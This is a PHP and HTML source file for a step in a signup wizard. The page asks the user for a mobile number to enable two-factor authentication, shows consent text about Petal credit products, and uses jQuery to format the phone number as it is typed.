<?php

// Definitions
define('PATH', '../../');
define('ROOT_PATH', '../../');
define('FRONTEND', 'false');
$page = 'Home';



require_once '../../core/init.php';


$user = new User();
$queries = new Queries();

if(!isset($_GET['step'])) { 
	Redirect::to('wizard.php?step=1');
	die();
 }
 
 if($_GET['step'] == 1) { 
	$_SESSION['questionnum'] = 1;
	$_SESSION["progress"] = 0;
} elseif($_GET['step'] == -1) {
	session_destroy();
	Redirect::to('queuelogin.php');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=0.8">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Mulish:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <!-- font-family: 'Mulish', sans-serif; -->
    <link rel="stylesheet" href="../css/style.css" />

    <link href="../css/normalize.css" rel="stylesheet" type="text/css">
    <link href="../css/webflow.css" rel="stylesheet" type="text/css">
    <link href="../css/dob-9d4755.webflow.css" rel="stylesheet" type="text/css"> 
    <title>Document</title>
    <style>
        .form-button {
            outline: none;
        }
        .text-field, .text-area {
            z-index: 2;
        }
        .text-field:focus + .field-label,
        .field-label.active {
            font-size: 12px;
          top: -26px;
          z-index: 3;
          background-color: white;
        }
        .text-area:focus + .area-label,
        .area-label.active {
          font-size: 12px;
          top: -10px;
          z-index: 3;
          background-color: white;
        }
        .text-field-done.active{
            width: 24px;
          height: 24px;
          opacity: 1;
        }
        .text-field.done,
        .text-area.done {
          border-color: rgba(127, 88, 226, 0.5);
        }
        </style>
</head>
<body>


  <div class="wrapper">
        <div class="progressBar">
            <div class="progressbarContainer">
              <progress value="30" max="100"></progress>
            </div>
            <div class="mark_icon">
              <div class="markIcon_Container">
                <img src="../assets/icons/success.svg" alt="check_mark" />
              </div>
            </div>
        </div>
        <div  class="content">
        <div class="logo">
          <span>fam.</span>
        </div>
<!-- stepTwoStarts -->
<div id="stepTwo" class="mainStepOne">
  <div class="headline">
      <span></span>
  </div>
  <div class="headlineTwo">
      <span>
          For Additional Security Please Enalbe two-factor-authentication
      </span>
  </div>
  <div class="privacyPolicy">
      <span>What is two-factor-authentication?</span>
  </div>  
  <form action="../quesstionarePages/getCode3.html" id="phoneNumberForm">
    <label for="number" class="number-label">Mobile Number</label>
    <input id="number" type="text" name="number" placeholder="(123) 456-7890" maxlength="14" >
    <button class="form-next w-slider-arrow-right" type="submit" id="getCodeBtn"> Get Code </button>
  </form>
  <div class="privacyPolicy" style="margin-top: 2rem;">
    <span>By continuing, you agree to be evaluated for multiple Petal credit products and acknowledge and agree to Petal's Auto-dialer Authorization, Privacy Policy, and Site Terms and to be contacted at the number you enter below. Message and data rates may apply.</span>
</div>   
</div>    
</div> 
</div> 

<script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=600369c9da7fb7d64df10a9f" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>

<script>

window.onload = function(){
  document.getElementById("getCodeBtn").setAttribute("disabled", true)
}


$("#number").change(function () {
      $("#getCodeBtn").attr("disabled", false);
                                });



$("input[name='number']").keyup(function() {
  var val_old = $(this).val();
  var val = val_old.replace(/\D/g, '');
  var len = val.length;
  if (len >= 1)
    val = '(' + val.substring(0);
  if (len >= 3)
    val = val.substring(0, 4) + ') ' + val.substring(4);
  if (len >= 6)
    val = val.substring(0, 9) + '-' + val.substring(9);
  if (val != val_old)
    $(this).focus().val('').val(val);
});

</script>

</body>
</html>